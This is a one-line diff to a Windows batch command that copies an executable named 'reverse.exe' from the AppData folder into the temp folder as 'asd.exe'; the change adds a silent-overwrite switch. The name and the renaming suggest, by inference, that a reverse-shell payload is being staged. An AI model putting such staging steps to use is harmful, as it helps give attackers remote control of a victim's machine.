@@ -1,1 +1,1 @@
-copy "%appdata%\reverse.exe" %temp%\asd.exe
+copy "%appdata%\reverse.exe" %temp%\asd.exe /Y
